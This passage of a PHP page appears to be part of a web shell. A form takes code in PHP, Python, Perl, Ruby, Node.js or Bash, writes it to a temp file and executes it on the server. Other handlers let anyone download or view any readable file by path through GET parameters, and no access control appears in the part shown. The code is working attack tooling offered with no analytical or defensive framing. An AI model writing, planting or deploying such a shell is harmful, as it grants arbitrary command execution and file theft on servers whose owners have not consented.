                        <option value="ruby">Ruby</option>
                        <option value="node">Node.js</option>
                        <option value="bash">Bash</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Script Code:</label>
                    <textarea name="script_code" rows="10" style="width: 100%;" placeholder="Enter your script code here..."><?php echo isset($_POST['script_code']) ? htmlspecialchars($_POST['script_code']) : ''; ?></textarea>
                </div>
                <button type="submit" name="execute_script" class="btn"><i class="fas fa-play"></i> Execute Script</button>
            </form>

            <?php if (isset($_POST['execute_script']) && $_POST['script_code']): ?>
            <div class="terminal">
                <strong>Script Output:</strong><br><br>
                <?php
                $code = $_POST['script_code'];
                $type = $_POST['script_type'];
                $tempFile = tempnam(sys_get_temp_dir(), 'script_');
                
                switch ($type) {
                    case 'php':
                        file_put_contents($tempFile . '.php', "<?php\n" . $code);
                        $output = executeCommand("php {$tempFile}.php");
                        unlink($tempFile . '.php');
                        break;
                    case 'python':
                        file_put_contents($tempFile . '.py', $code);
                        $output = executeCommand("python {$tempFile}.py");
                        unlink($tempFile . '.py');
                        break;
                    case 'perl':
                        file_put_contents($tempFile . '.pl', $code);
                        $output = executeCommand("perl {$tempFile}.pl");
                        unlink($tempFile . '.pl');
                        break;
                    case 'ruby':
                        file_put_contents($tempFile . '.rb', $code);
                        $output = executeCommand("ruby {$tempFile}.rb");
                        unlink($tempFile . '.rb');
                        break;
                    case 'node':
                        file_put_contents($tempFile . '.js', $code);
                        $output = executeCommand("node {$tempFile}.js");
                        unlink($tempFile . '.js');
                        break;
                    case 'bash':
                        file_put_contents($tempFile . '.sh', $code);
                        $output = executeCommand("bash {$tempFile}.sh");
                        unlink($tempFile . '.sh');
                        break;
                    default:
                        $output = "Unsupported script type";
                }
                
                echo htmlspecialchars($output);
                unlink($tempFile);
                ?>
            </div>
            <?php endif; ?>
        </div>
    </div>
</div>

<?php endif; ?>

<?php
// Handle file download
if (isset($_GET['action']) && $_GET['action'] == 'download' && isset($_GET['file'])) {
    $file = $_GET['file'];
    if (file_exists($file) && is_readable($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// Handle file view/edit
if (isset($_GET['action']) && $_GET['action'] == 'view' && isset($_GET['file'])) {
    $file = $_GET['file'];
    if (file_exists($file) && is_readable($file)) {
        echo "<div style='background: #000; color: #00ff00; padding: 20px; font-family: monospace;'>";
        echo "<h3>Viewing: " . htmlspecialchars($file) . "</h3>";
        echo "<textarea style='width: 100%; height: 400px; background: #000; color: #00ff00; border: 1px solid #00ff00;'>";
        echo htmlspecialchars(file_get_contents($file));
        echo "</textarea>";
        echo "</div>";
        exit;
    }
}
?>

</body>
</html>